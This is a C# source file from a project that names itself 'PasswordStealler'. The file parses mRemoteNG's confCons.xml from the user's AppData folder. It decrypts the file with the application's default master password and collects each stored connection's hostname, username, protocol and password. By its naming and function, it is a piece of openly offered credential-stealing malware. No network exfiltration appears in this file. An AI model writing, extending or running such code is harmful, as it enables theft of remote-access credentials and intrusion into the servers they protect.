using Org.BouncyCastle.Asn1.Cms;
using PasswordStealler.Decryption;
using PasswordStealler.Factories;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Linq;
using static System.Net.Mime.MediaTypeNames;

namespace PasswordStealler.ConfParser
{
    public class Connection
    {
        public string connectionName {get; set;}

        public string password { get; set; }

        public string username { get; set; }

        public string hostname { get; set; }

        public string proto { get; set; }

        public string defaultPass = "mR3m";
    }

    public class ConfigParser
    {
        public static List<Connection> ConfigParse(string pathToXml)
        {
            return ConfigParse(pathToXml, null);
        }


        public static List<Connection> ConfigParse(string pathToXml, string? masterPassword)
        {

            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (string.IsNullOrEmpty(pathToXml))
            {
                pathToXml = Path.Combine(appDataPath, "mRemoteNG", "confCons.xml");
            }

            XDocument xDocHeader = XDocument.Load(pathToXml);
            XElement rootHeader = xDocHeader.Root
                ?? throw new InvalidOperationException("confCons.xml: отсутствует корневой элемент");


            bool fullFileEncryption = false;
            XAttribute? fullEncAttr = rootHeader.Attribute("FullFileEncryption");
            if (fullEncAttr != null &&
                bool.TryParse(fullEncAttr.Value, out bool parsed))
            {
                fullFileEncryption = parsed;
            }

            ICryptographyProvider cryptoProvider =
                new CryptoProviderFactoryFromXml(rootHeader).Build();


            string effectiveMasterPassword = string.IsNullOrEmpty(masterPassword)
                ? "mR3m"
                : masterPassword;


            XmlDocument xDocToParse = new XmlDocument();

            if (fullFileEncryption)
            {

 
                string encryptedBlob = rootHeader.Value.Trim();
                if (string.IsNullOrEmpty(encryptedBlob))
                    throw new InvalidOperationException("FullFileEncryption включён, но данных внутри Connections нет.");


                string plainXml = cryptoProvider.Decrypt(
                    encryptedBlob,
                    effectiveMasterPassword.ConvertToSecureString());
                plainXml = plainXml.Trim('\0');


                string wrappedXml = "<Root>" + plainXml + "</Root>";


                xDocToParse.LoadXml(wrappedXml);
            }
            else
            {

                xDocToParse.Load(pathToXml);
            }


            XmlElement? xRoot = xDocToParse.DocumentElement;
            List<Connection> connections = new List<Connection>();

            if (xRoot != null)
            {

                foreach (XmlNode node in xRoot.ChildNodes)
                {
                    if (node.NodeType != XmlNodeType.Element)
                        continue;

                    XmlElement xnode = (XmlElement)node;
                    XmlAttributeCollection attributes = xnode.Attributes;
                    Connection connection = new Connection();

                    foreach (XmlAttribute attr in attributes)
                    {
                        if (attr.Name == "Password")
                            connection.password = attr.Value;

                        if (attr.Name == "Name")
                            connection.connectionName = attr.Value;

                        if (attr.Name == "Hostname")
                            connection.hostname = attr.Value;

                        if (attr.Name == "Username")
                            connection.username = attr.Value;

                        if (attr.Name == "Protocol")
                            connection.proto = attr.Value;
                    }

                    connections.Add(connection);
                }
            }

            return connections;
        }

    }


}
